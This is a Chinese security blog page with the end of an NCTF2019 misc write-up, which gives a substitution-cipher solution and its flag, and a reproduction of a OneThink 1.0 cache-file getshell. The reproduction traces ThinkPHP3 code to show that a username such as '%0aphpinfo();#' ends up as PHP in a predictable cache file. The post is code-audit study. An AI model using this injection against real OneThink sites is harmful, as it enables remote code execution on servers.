<p>在百度上找到：<a href="https://blog.csdn.net/vhkjhwbs/article/details/100775409" target="_blank" rel="noopener">https://blog.csdn.net/vhkjhwbs/article/details/100775409</a></p>
<p>自己写一个对应表</p>
<p><img src="/.com//28.png" alt="img"></p>
<p>这里的yyy  eee 这样子非单个字符的字符串对应某个字符，这个字符随便写一个就好了，我这里ooo＝o,当然也可以是ooo=x等等，不和已有的单字符重复就好了．．．</p>
<p>然后放到：<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p>
<p>跑一下就好</p>
<p><img src="/.com//29.png" alt="img"></p>
<p><img src="/.com//32.png" alt="img"></p>
<p>这里我疯了，flag是：NCTF{youaresosmartthatthisisjustapieceofcake}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/29/NCTF2019-Misc-web/" data-id="ck8sqr5id000gkou552y807ly" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-onethink1-0缓存文件getshell-复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/19/onethink1-0%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6getshell-%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2019-11-19T12:46:33.000Z" itemprop="datePublished">2019-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/19/onethink1-0%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6getshell-%E5%A4%8D%E7%8E%B0/">onethink1.0缓存文件getshell(复现)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这实际上是i春秋的一道题，上网搜到<code>POC</code>后，我就直接一把梭地打过去,没有去深究漏洞产生的原因。</p>
<p>这里利用的是缓存文件没有合理过滤造成的漏洞，从而前台<code>getshell</code>了。因为没有遇到过这种情况，所以这里也就复现一下这个漏洞。</p>
<p><code>php5.6+deepin5.11</code></p>
<p><code>onethink1.0</code></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>这套<code>cms</code>是基于<code>thinkphp3</code>进行的二次开发</p>
<p><code>./Application/Home/Model/MemberModel.class.php--function login() line 35</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   　 <span class="comment">/**</span></span><br><span class="line"><span class="comment"> 　* 登录指定用户</span></span><br><span class="line"><span class="comment">　 * <span class="doctag">@param</span>  integer $uid 用户ID</span></span><br><span class="line"><span class="comment">　 * <span class="doctag">@return</span> boolean      ture-登录成功，false-登录失败</span></span><br><span class="line"><span class="comment">　 */</span>    </span><br><span class="line">　　　　<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($uid)</span></span>&#123;</span><br><span class="line">    <span class="comment">/* 检测是否在当前应用注册 */</span></span><br><span class="line">    $user = <span class="keyword">$this</span>-&gt;field(<span class="keyword">true</span>)-&gt;find($uid);</span><br><span class="line">    <span class="keyword">if</span>(!$user)&#123; <span class="comment">//未注册</span></span><br><span class="line">        <span class="comment">/* 在当前应用中注册用户 */</span></span><br><span class="line">    	$Api = <span class="keyword">new</span> UserApi();</span><br><span class="line">    	$info = $Api-&gt;info($uid);</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;create(<span class="keyword">array</span>(<span class="string">'nickname'</span> =&gt; $info[<span class="number">1</span>], <span class="string">'status'</span> =&gt; <span class="number">1</span>));</span><br><span class="line">        $user[<span class="string">'uid'</span>] = $uid;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;add($user))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="string">'前台用户信息注册失败，请重试！'</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="number">1</span> != $user[<span class="string">'status'</span>]) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error = <span class="string">'用户未激活或已禁用！'</span>; <span class="comment">//应用级别禁用</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 登录用户 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;autoLogin($user);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//记录行为</span></span><br><span class="line">    action_log(<span class="string">'user_login'</span>, <span class="string">'member'</span>, $uid, $uid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数是用于登录指定用户时被调用的，由于我们之前已经将注册过了，所以用户信息已经被存入数据库中。</p>
<p><img src="/.com//cookie/Pictures/blogs/onethink1.0%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6getshell%5B%E5%A4%8D%E7%8E%B0%5D/%EF%BC%91.png" alt></p>
<p><code>login()</code>的参数是<code>$uid</code>，这个参数来自于数据库中的记录，在数据库中查找该用户的id，正确情况下跟踪到函数<code>$this-&gt;autoLogin($user);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">autoLogin</span><span class="params">($user)</span></span>&#123;</span><br><span class="line">        <span class="comment">/* 更新登录信息 */</span></span><br><span class="line">        $data = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'uid'</span>             =&gt; $user[<span class="string">'uid'</span>],</span><br><span class="line">            <span class="string">'login'</span>           =&gt; <span class="keyword">array</span>(<span class="string">'exp'</span>, <span class="string">'`login`+1'</span>),</span><br><span class="line">            <span class="string">'last_login_time'</span> =&gt; NOW_TIME,</span><br><span class="line">            <span class="string">'last_login_ip'</span>   =&gt; get_client_ip(<span class="number">1</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save($data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 记录登录SESSION和COOKIES */</span></span><br><span class="line">        $auth = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'uid'</span>             =&gt; $user[<span class="string">'uid'</span>],</span><br><span class="line">            <span class="string">'username'</span>        =&gt; get_username($user[<span class="string">'uid'</span>]),</span><br><span class="line">            <span class="string">'last_login_time'</span> =&gt; $user[<span class="string">'last_login_time'</span>],</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        session(<span class="string">'user_auth'</span>, $auth);</span><br><span class="line">        session(<span class="string">'user_auth_sign'</span>, data_auth_sign($auth));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用函数<code>get_username()</code>，跟踪这个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据用户ID获取用户名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $uid 用户ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string       用户名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_username</span><span class="params">($uid = <span class="number">0</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $list;</span><br><span class="line">    <span class="keyword">if</span>(!($uid &amp;&amp; is_numeric($uid)))&#123; <span class="comment">//获取当前登录用户名</span></span><br><span class="line">        <span class="keyword">return</span> session(<span class="string">'user_auth.username'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取缓存数据 */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($list))&#123;</span><br><span class="line">        $list = S(<span class="string">'sys_active_user_list'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 查找用户信息 */</span></span><br><span class="line">    $key = <span class="string">"u&#123;$uid&#125;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($list[$key]))&#123; <span class="comment">//已缓存，直接使用</span></span><br><span class="line">        $name = $list[$key];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//调用接口获取用户信息</span></span><br><span class="line">        $User = <span class="keyword">new</span> User\Api\UserApi();</span><br><span class="line">        $info = $User-&gt;info($uid);</span><br><span class="line">        <span class="keyword">if</span>($info &amp;&amp; <span class="keyword">isset</span>($info[<span class="number">1</span>]))&#123;</span><br><span class="line">            $name = $list[$key] = $info[<span class="number">1</span>];</span><br><span class="line">            <span class="comment">/* 缓存用户 */</span></span><br><span class="line">            $count = count($list);</span><br><span class="line">            $max   = C(<span class="string">'USER_MAX_CACHE'</span>);</span><br><span class="line">            <span class="keyword">while</span> ($count-- &gt; $max) &#123;</span><br><span class="line">                array_shift($list);</span><br><span class="line">            &#125;</span><br><span class="line">            S(<span class="string">'sys_active_user_list'</span>, $list);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $name = <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$User = <span class="keyword">new</span> User\Api\UserApi();</span><br><span class="line">$info = $User-&gt;info($uid);</span><br><span class="line"><span class="keyword">if</span>($info &amp;&amp; <span class="keyword">isset</span>($info[<span class="number">1</span>]))&#123;</span><br><span class="line">    $name = $list[$key] = $info[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">/* 缓存用户 */</span></span><br><span class="line">    $count = count($list);</span><br><span class="line">    $max   = C(<span class="string">'USER_MAX_CACHE'</span>);</span><br><span class="line">    <span class="keyword">while</span> ($count-- &gt; $max) &#123;</span><br><span class="line">        array_shift($list);</span><br><span class="line">    &#125;</span><br><span class="line">    S(<span class="string">'sys_active_user_list'</span>, $list);</span><br></pre></td></tr></table></figure>

<p>这里调用了<code>S()</code>函数,可以看到<code>$name=&gt;&#39;sys_active_user_list&#39;,$value=&gt;$list=&gt;$info[1]</code>，其中<code>$info[1]</code></p>
<p>来自数据库查询的结果，查询结果中的<code>nickname</code>。可以看到这里调用了函数<code>set()</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">S</span><span class="params">($name,$value=<span class="string">''</span>,$options=null)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $cache   =   <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(is_array($options) &amp;&amp; <span class="keyword">empty</span>($cache))&#123;</span><br><span class="line">        <span class="comment">// 缓存操作的同时初始化</span></span><br><span class="line">        $type       =   <span class="keyword">isset</span>($options[<span class="string">'type'</span>])?$options[<span class="string">'type'</span>]:<span class="string">''</span>;</span><br><span class="line">        $cache      =   Think\Cache::getInstance($type,$options);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(is_array($name)) &#123; <span class="comment">// 缓存初始化</span></span><br><span class="line">        $type       =   <span class="keyword">isset</span>($name[<span class="string">'type'</span>])?$name[<span class="string">'type'</span>]:<span class="string">''</span>;</span><br><span class="line">        $cache      =   Think\Cache::getInstance($type,$name);</span><br><span class="line">        <span class="keyword">return</span> $cache;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="keyword">empty</span>($cache)) &#123; <span class="comment">// 自动初始化</span></span><br><span class="line">        $cache      =   Think\Cache::getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">''</span>=== $value)&#123; <span class="comment">// 获取缓存</span></span><br><span class="line">        <span class="keyword">return</span> $cache-&gt;get($name);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(is_null($value)) &#123; <span class="comment">// 删除缓存</span></span><br><span class="line">        <span class="keyword">return</span> $cache-&gt;rm($name);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123; <span class="comment">// 缓存数据</span></span><br><span class="line">        <span class="keyword">if</span>(is_array($options)) &#123;</span><br><span class="line">            $expire     =   <span class="keyword">isset</span>($options[<span class="string">'expire'</span>])?$options[<span class="string">'expire'</span>]:<span class="keyword">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $expire     =   is_numeric($options)?$options:<span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $cache-&gt;set($name, $value, $expire);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进函数<code>set()</code>，缓存文件的操作类<code>./Library/Think/Cache/Driver/File.class.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写入缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 缓存变量名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value  存储数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $expire  有效时间 0为永久</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolen</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name,$value,$expire=null)</span> </span>&#123;</span><br><span class="line">    N(<span class="string">'cache_write'</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(is_null($expire)) &#123;</span><br><span class="line">        $expire =  <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $filename   =   <span class="keyword">$this</span>-&gt;filename($name);</span><br><span class="line">    $data   =   serialize($value);</span><br><span class="line">    <span class="keyword">if</span>( C(<span class="string">'DATA_CACHE_COMPRESS'</span>) &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data   =   gzcompress($data,<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(C(<span class="string">'DATA_CACHE_CHECK'</span>)) &#123;<span class="comment">//开启数据校验</span></span><br><span class="line">        $check  =  md5($data);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $check  =  <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data    = <span class="string">"&lt;?php\n//"</span>.sprintf(<span class="string">'%012d'</span>,$expire).$check.$data.<span class="string">"\n?&gt;"</span>;</span><br><span class="line">    $result  =   file_put_contents($filename,$data);</span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">'length'</span>]&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 记录缓存队列</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;queue($name);</span><br><span class="line">        &#125;</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数用于写入缓存。关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$filename   =   <span class="keyword">$this</span>-&gt;filename($name);</span><br><span class="line">$data   =   serialize($value);</span><br><span class="line">$data    = <span class="string">"&lt;?php\n//"</span>.sprintf(<span class="string">'%012d'</span>,$expire).$check.$data.<span class="string">"\n?&gt;"</span>;</span><br><span class="line">$result  =   file_put_contents($filename,$data);</span><br></pre></td></tr></table></figure>

<p>这个<code>filename()</code>如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取得变量的存储文件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 缓存变量名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filename</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">    $name	=	md5($name);</span><br><span class="line">    <span class="keyword">if</span>(C(<span class="string">'DATA_CACHE_SUBDIR'</span>)) &#123;</span><br><span class="line">        <span class="comment">// 使用子目录</span></span><br><span class="line">        $dir   =<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;C(<span class="string">'DATA_PATH_LEVEL'</span>);$i++) &#123;</span><br><span class="line">            $dir	.=	$name&#123;$i&#125;.<span class="string">'/'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir,<span class="number">0755</span>,<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $filename	=	$dir.<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $filename	=	<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们查看<code>./ThinkPHP/Conf/convertion.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 数据缓存设置 */</span></span><br><span class="line">....</span><br><span class="line"><span class="string">'DATA_CACHE_PATH'</span>       =&gt;  TEMP_PATH,<span class="comment">// 缓存路径设置 (仅对File方式缓存有效)</span></span><br><span class="line"><span class="string">'DATA_CACHE_SUBDIR'</span>     =&gt;  <span class="keyword">false</span>,    <span class="comment">// 使用子目录缓存 (自动根据缓存标识的哈希创建子目录)</span></span><br><span class="line"><span class="string">'DATA_PATH_LEVEL'</span>       =&gt;  <span class="number">1</span>,        <span class="comment">// 子目录缓存级别</span></span><br></pre></td></tr></table></figure>

<p>查看<code>./ThinkPHP/ThinkPHP.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defined(<span class="string">'TEMP_PATH'</span>)    <span class="keyword">or</span> define(<span class="string">'TEMP_PATH'</span>,      RUNTIME_PATH.<span class="string">'Temp/'</span>); <span class="comment">// 项目缓存目录</span></span><br></pre></td></tr></table></figure>



<p>所以最终文件存放位置就是<code>./Runtime/temp/md5($).php</code>由于这里的<code>$name</code>为<code>sys_active_user_list</code>，知道文件存放位置后，我们就可以去构造payload了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data    = <span class="string">"&lt;?php\n//"</span>.sprintf(<span class="string">'%012d'</span>,$expire).$check.$data.<span class="string">"\n?&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p>我们构造payload：<code>%0aphpinfo();#</code></p>
<p><code>%0</code> 使得我们传入的参数不被注释，<code>#</code>使得序列化后的字符失效。</p>
<p>注册一个用户，使得用户名为payload，不过在注册时，要抓包，将<code>%0a</code>解码一下。</p>
<p>登录该用户，使得用户名为payload，不过在登录时，要抓包，将<code>%0a</code>解码一下。</p>
<p>然后查看缓存文件</p>
<p><img src="/.com//cookie/Pictures/blogs/onethink1.0%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6getshell%5B%E5%A4%8D%E7%8E%B0%5D/2.png" alt></p>
<p><img src="/.com//cookie/Pictures/blogs/onethink1.0%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6getshell%5B%E5%A4%8D%E7%8E%B0%5D/3.png" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>漏洞不是很复杂，但是对tp的框架的理解还有待提高</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/19/onethink1-0%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6getshell-%E5%A4%8D%E7%8E%B0/" data-id="ck8sqr5jv0012kou59cytgckl" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
          </li>
        
          <li>
            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
          </li>
        
          <li>
            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>